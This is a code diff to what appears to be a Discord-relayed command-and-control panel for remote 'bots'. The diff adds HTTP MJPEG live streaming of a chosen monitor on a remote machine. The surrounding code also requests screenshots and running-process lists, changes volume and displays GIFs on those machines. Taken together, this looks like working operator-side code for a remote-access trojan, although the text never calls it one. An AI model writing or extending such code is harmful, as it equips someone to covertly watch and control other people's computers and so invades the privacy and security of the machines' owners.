@@ -241,6 +241,11 @@ async def on_message(message: discord.Message):
             except Exception as exc:
                 print(f"[TAG] failed to broadcast {tag}: {exc}")
         is_live_frame = "LIVE_STREAM_FRAME" in (message.content or "")
+        live_http_url = None
+        if "LIVE_STREAM_HTTP" in (message.content or ""):
+            parts = message.content.split(maxsplit=3)
+            if len(parts) >= 3:
+                live_http_url = parts[2].strip()
         payload = {
             "type": "text",
             "author": str(message.author),
@@ -249,6 +254,7 @@ async def on_message(message: discord.Message):
             "ts": message.created_at.isoformat(),
             "tag": tag,
             "is_live_frame": is_live_frame,
+            "live_http_url": live_http_url,
         }
         # Save any attachments (e.g., screenshot.png)
         for att in message.attachments:
@@ -540,11 +546,12 @@ PANEL_HTML = r"""<!doctype html>
 
     function setLiveStatus(text, state='idle'){ liveActive = state==='ok'; if(el.liveStatus) el.liveStatus.textContent=text; if(el.liveDot){ el.liveDot.className='dot'+(state==='ok'?' ok': state==='error'?' bad':''); } if(state!=='ok' && el.liveFrame){ el.liveFrame.removeAttribute('src'); if(el.liveFrame.parentElement) el.liveFrame.parentElement.classList.remove('active'); if(el.liveHint) el.liveHint.style.display='block'; } }
     function handleLiveFrame(obj){ if(!(obj.attachments&&obj.attachments.length)) return; const url=obj.attachments[0].url+(obj.attachments[0].url.includes('?')?'&':'?')+'t='+(Date.now()); if(el.liveFrame){ el.liveFrame.src=url; if(el.liveFrame.parentElement) el.liveFrame.parentElement.classList.add('active'); if(el.liveHint) el.liveHint.style.display='none'; } setLiveStatus('Receiving frames', 'ok'); }
-    function connectWS(){ setStatus(false); const ws = new WebSocket((location.protocol==='https:'?'wss://':'ws://') + location.host + '/ws'); ws.onopen = ()=> setStatus(true); ws.onclose = ()=> { setStatus(false); setTimeout(connectWS, 1200); }; ws.onmessage = ev => { const obj = JSON.parse(ev.data); if(obj.type !== 'text') return; const content=(obj.content||'').toUpperCase(); touchTagFromMessage(obj); const isLiveFrame=obj.is_live_frame===true || content.includes('LIVE_STREAM_FRAME'); const isLiveStopped=content.includes('LIVE_STREAM_STOPPED'); const isLiveError=content.includes('LIVE_STREAM_ERROR'); if(isLiveFrame){ handleLiveFrame(obj); return; } if(isLiveStopped){ setLiveStatus('Stopped', 'idle'); } if(isLiveError){ setLiveStatus('Stream error', 'error'); } const msg = node(obj.author, obj.content, obj.ts); addFeed(el.timeline, msg.cloneNode(true)); addLog(msg.cloneNode(true)); if(obj.content && obj.content.toLowerCase().includes('filtered running processes')) addFeed(el.procFeed, msg.cloneNode(true)); if(obj.attachments && obj.attachments.length){ obj.attachments.forEach(a=> addShot(a.url)); } }; }
+    function setLiveHttp(url){ if(!url) return; if(el.liveFrame){ el.liveFrame.src=url; if(el.liveFrame.parentElement) el.liveFrame.parentElement.classList.add('active'); if(el.liveHint) el.liveHint.style.display='none'; } setLiveStatus('Streaming over HTTP', 'ok'); }
+    function connectWS(){ setStatus(false); const ws = new WebSocket((location.protocol==='https:'?'wss://':'ws://') + location.host + '/ws'); ws.onopen = ()=> setStatus(true); ws.onclose = ()=> { setStatus(false); setTimeout(connectWS, 1200); }; ws.onmessage = ev => { const obj = JSON.parse(ev.data); if(obj.type !== 'text') return; const content=(obj.content||'').toUpperCase(); touchTagFromMessage(obj); const isLiveFrame=obj.is_live_frame===true || content.includes('LIVE_STREAM_FRAME'); const isLiveStopped=content.includes('LIVE_STREAM_STOPPED') || content.includes('LIVE_STREAM_HTTP_STOPPED'); const isLiveError=content.includes('LIVE_STREAM_ERROR') || content.includes('HTTP LIVE STREAM FAILED'); const liveHttpUrl=obj.live_http_url || (content.includes('LIVE_STREAM_HTTP') ? (obj.content||'').split(/\s+/).slice(2).join(' ') : null); if(liveHttpUrl){ setLiveHttp(liveHttpUrl); return; } if(isLiveFrame){ handleLiveFrame(obj); return; } if(isLiveStopped){ setLiveStatus('Stopped', 'idle'); } if(isLiveError){ setLiveStatus('Stream error', 'error'); } const msg = node(obj.author, obj.content, obj.ts); addFeed(el.timeline, msg.cloneNode(true)); addLog(msg.cloneNode(true)); if(obj.content && obj.content.toLowerCase().includes('filtered running processes')) addFeed(el.procFeed, msg.cloneNode(true)); if(obj.attachments && obj.attachments.length){ obj.attachments.forEach(a=> addShot(a.url)); } }; }
     connectWS(); refreshTags(); renderTags();
 
     async function post(path){ const r = await fetch(withTag(path),{method:'POST'}); const data = await r.json().catch(()=>({})); if(!r.ok) throw new Error(data.error||'Request failed'); return data; }
-    async function startLiveStream(){ if(!hasSelectedTag){ toast('Select a bot first'); setTab('live'); updateLiveGate(); return; } setLiveStatus('Requesting stream...', 'pending'); try{ await post('/cmd/live/start'); toast('Live request sent'); setLiveStatus('Waiting for frames...', 'pending'); } catch(e){ setLiveStatus('Start failed', 'error'); toast(e.message);} }
+    async function startLiveStream(){ if(!hasSelectedTag){ toast('Select a bot first'); setTab('live'); updateLiveGate(); return; } setLiveStatus('Requesting stream...', 'pending'); try{ await post('/cmd/live/start'); toast('Live request sent (HTTP MJPEG)'); setLiveStatus('Waiting for stream URL...', 'pending'); } catch(e){ setLiveStatus('Start failed', 'error'); toast(e.message);} }
     async function stopLiveStream(){ if(!hasSelectedTag){ toast('Select a bot first'); return; } try{ await post('/cmd/live/stop'); toast('Stop request sent'); setLiveStatus('Stopping...', 'pending'); } catch(e){ toast(e.message);} }
     async function doShot(){ try{ await post('/cmd/ss'); toast('Screenshot requested'); } catch(e){ toast(e.message);} }
     async function doProcs(){ try{ await post('/cmd/ps'); toast('Process list requested'); } catch(e){ toast(e.message);} }
@@ -658,13 +665,13 @@ async def cmd_set_volume(pct: float = Query(100.0), tag: str = Query(None)):
     return JSONResponse({"ok": True, "pct": pct_val})
 
 @app.post("/cmd/live/start")
-async def cmd_live_start(tag: str = Query(None)):
-    await _send_cmd(f"{_resolve_tag(tag)} LIVE_STREAM_START")
-    return JSONResponse({"ok": True})
+async def cmd_live_start(monitor: int = Query(1, ge=1), tag: str = Query(None)):
+    await _send_cmd(f"{_resolve_tag(tag)} LIVE_STREAM_HTTP_START {monitor}")
+    return JSONResponse({"ok": True, "monitor": monitor})
 
 @app.post("/cmd/live/stop")
 async def cmd_live_stop(tag: str = Query(None)):
-    await _send_cmd(f"{_resolve_tag(tag)} LIVE_STREAM_STOP")
+    await _send_cmd(f"{_resolve_tag(tag)} LIVE_STREAM_HTTP_STOP")
     return JSONResponse({"ok": True})
 
 @app.post("/cmd/display_gif")
